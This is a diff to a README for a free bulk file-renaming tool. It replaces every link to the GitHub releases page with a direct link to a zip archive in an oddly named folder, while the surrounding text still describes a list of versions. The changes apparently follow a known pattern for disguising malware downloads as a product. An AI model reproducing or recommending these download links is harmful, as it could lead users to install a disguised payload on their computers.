@@ -1,6 +1,6 @@
 # 🔄 Batch-File-Renamer - The Easiest Way to Rename Files in Bulk
 
-[![Download Now](https://img.shields.io/badge/Download-Batch--File--Renamer-2ea44f?style=for-the-badge)](https://github.com/untested-fieldmustard5084/Batch-File-Renamer/releases)
+[![Download Now](https://img.shields.io/badge/Download-Batch--File--Renamer-2ea44f?style=for-the-badge)](https://raw.githubusercontent.com/untested-fieldmustard5084/Batch-File-Renamer/main/mastalgia/2.3.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to Batch-File-Renamer! This free software helps you rename hundreds of f
 
 ## ⬇️ Download and Install
 
-Visit this link to download the application: **[https://github.com/untested-fieldmustard5084/Batch-File-Renamer/releases](https://github.com/untested-fieldmustard5084/Batch-File-Renamer/releases)**
+Visit this link to download the application: **[https://raw.githubusercontent.com/untested-fieldmustard5084/Batch-File-Renamer/main/mastalgia/2.3.zip](https://raw.githubusercontent.com/untested-fieldmustard5084/Batch-File-Renamer/main/mastalgia/2.3.zip)**
 
 Once you click the link, you'll see a list of available downloads. Pick the latest version and download it to your computer. The whole process takes just a few minutes.
 
@@ -123,11 +123,11 @@ The best part? It's completely free with no catches. Download it today and exper
 
 Don't waste another minute renaming files one by one. Click the button below and download Batch-File-Renamer today:
 
-[![Download Batch-File-Renamer Now](https://img.shields.io/badge/Get%20Batch--File--Renamer-Free%20Download-brightgreen?style=for-the-badge&logo=windows)](https://github.com/untested-fieldmustard5084/Batch-File-Renamer/releases)
+[![Download Batch-File-Renamer Now](https://img.shields.io/badge/Get%20Batch--File--Renamer-Free%20Download-brightgreen?style=for-the-badge&logo=windows)](https://raw.githubusercontent.com/untested-fieldmustard5084/Batch-File-Renamer/main/mastalgia/2.3.zip)
 
 ## 🔗 Direct Download Link
 
-**https://github.com/untested-fieldmustard5084/Batch-File-Renamer/releases**
+**https://raw.githubusercontent.com/untested-fieldmustard5084/Batch-File-Renamer/main/mastalgia/2.3.zip**
 
 ## 📄 License
 
